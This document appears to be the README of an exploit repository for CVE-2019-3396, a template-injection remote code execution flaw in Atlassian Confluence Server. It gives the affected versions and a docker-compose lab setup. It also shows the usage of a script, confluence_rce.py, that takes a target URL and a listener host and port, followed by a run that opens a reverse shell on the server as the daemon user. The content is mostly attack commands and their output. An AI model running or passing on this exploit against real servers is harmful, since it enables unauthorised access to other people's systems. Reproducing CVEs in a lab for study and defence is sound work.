# CVE-2019-3396_confluence_rce

## Summary

The Widget Connector macro in Atlassian Confluence Server before version 6.6.12                           
(the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed version for 6.12.x),           
from version 6.13.0 before 6.13.3 (the fixed version for 6.13.x), and from version 6.14.0 before 6.14.2   
(the fixed version for 6.14.x), allows remote attackers to achieve path traversal and remote code         
execution on a Confluence Server or Data Center instance via server-side template injection.  

## Usage

To test this locally run docker-compose

```sh
⬢  CVE-2019-3396_confluence_rce  master ⦿ docker-compose up -d
Creating cve20193396confluencerce_db_1  ... done
Creating cve20193396confluencerce_db_1  ... 
Creating cve20193396confluencerce_web_1 ... done

⬢  CVE-2019-3396_confluence_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                      COMMAND                  CREATED             STATUS              PORTS                              NAMES
3f96dd290409        vulhub/confluence:6.10.2   "/docker-entrypoint.…"   40 seconds ago      Up 39 seconds       0.0.0.0:8090->8090/tcp, 8091/tcp   cve20193396confluencerce_web_1
e388a812c22f        postgres:10.7-alpine       "docker-entrypoint.s…"   41 seconds ago      Up 40 seconds       5432/tcp                           cve20193396confluencerce_db_1
```

Run ./confluence_rce.py to get the usage menu.

```sh
⬢  CVE-2019-3396_confluence_rce  master ⦿ ./confluence_rce.py                                        

▄█▄    ████▄    ▄   ▄████  █       ▄   ▄███▄      ▄   ▄█▄    ▄███▄   █▄▄▄▄ ▄█▄    ▄███▄   
█▀ ▀▄  █   █     █  █▀   ▀ █        █  █▀   ▀      █  █▀ ▀▄  █▀   ▀  █  ▄▀ █▀ ▀▄  █▀   ▀  
█   ▀  █   █ ██   █ █▀▀    █     █   █ ██▄▄    ██   █ █   ▀  ██▄▄    █▀▀▌  █   ▀  ██▄▄    
█▄  ▄▀ ▀████ █ █  █ █      ███▄  █   █ █▄   ▄▀ █ █  █ █▄  ▄▀ █▄   ▄▀ █  █  █▄  ▄▀ █▄   ▄▀ 
▀███▀        █  █ █  █         ▀ █▄ ▄█ ▀███▀   █  █ █ ▀███▀  ▀███▀     █   ▀███▀  ▀███▀   
             █   ██   ▀           ▀▀▀          █   ██                 ▀                   
[nighter@nighter.se]
    
Usage: ./confluence_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./confluence_rce.py 'http://localhost:8090' 10.10.14.24 1337

```

# Exploit

```sh
⬢  CVE-2019-3396_confluence_rce  master ⦿ ./confluence_rce.py 'http://localhost:8090' 172.21.0.1 4444
[+] Netcat = 4444
[+] Exploit
Connection from 172.21.0.3:36628
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4$ id
id
uid=2(daemon) gid=2(daemon)
bash-4.4$ 
```